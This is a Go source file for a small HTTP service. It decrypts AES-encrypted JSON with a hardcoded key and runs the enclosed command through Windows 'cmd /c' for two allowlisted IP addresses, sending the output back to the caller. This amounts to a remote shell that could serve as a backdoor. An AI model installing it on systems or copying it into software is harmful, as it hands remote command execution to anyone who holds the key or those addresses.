package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"

	"github.com/donnie4w/go-logger/logger"
)

type User struct {
	Command string
}

type Parameter struct {
	//	Log      bool
	Path     string
	FileName string
}

const ShellToUse = "cmd"

func Shellout(command string) (error, string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command(ShellToUse, "/c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return err, stdout.String(), stderr.String()
}

func NewCFBDecrypter(Code string) []byte {
	key, _ := hex.DecodeString("6368616e676520746869732070610808")
	ciphertext, _ := hex.DecodeString(Code)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)
	return ciphertext
}

func (pa *Parameter) handler(w http.ResponseWriter, r *http.Request) {
	var u User
	if r.Body == nil {
		http.Error(w, "Please send a request body", 400)
		return
	}
	body, _ := ioutil.ReadAll(r.Body)
	d := NewCFBDecrypter(string(body))
	b := bytes.NewBuffer(d)
	err := json.NewDecoder(b).Decode(&u)

	logger.SetConsole(false)
	//	var lg = logger.GetLogger()
	//	lg.SetLevel(logger.INFO)
	//	lg.SetLevelFile(logger.INFO, `/tmp/`, "info.log")
	//	lg.SetLevelFile(logger.WARN, `/tmp/`, "warn.log")
	logger.SetLevel(logger.INFO)
	logger.SetRollingDaily(pa.Path, pa.FileName)

	//fmt.Println(u)

	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
	Cip := strings.Split(r.RemoteAddr, ":")
	logger.Info("Remote addr is: ", Cip[0])
	logger.Info(string(d))
	//fmt.Println(Cip[0])
	if Cip[0] == "200.200.30.103" || Cip[0] == "200.200.30.104" {
		err, out, errout := Shellout(u.Command)
		if err != nil {
			fmt.Println("error: %v\n", err)
		}
		w.Write([]byte(out))
		if len(errout) > 1 {
			logger.Error(errout)
		}
	}
}

func main() {
	logs := flag.Bool("logs", false, "a bool value: true or false")
	port := flag.String("port", ":10000", "run port")
	flag.Parse()
	if *logs {
		myHandler := &Parameter{Path: "./", FileName: "info.log"}
		http.HandleFunc("/", myHandler.handler)
	} else {
		myHandler := &Parameter{Path: "/", FileName: "nul"}
		http.HandleFunc("/", myHandler.handler)
	}

	//	http.HandleFunc("/", myHandler.handler)
	err := http.ListenAndServe(*port, nil)
	if err != nil {
		fmt.Println("ListenAndServe: ", err)
	}
}
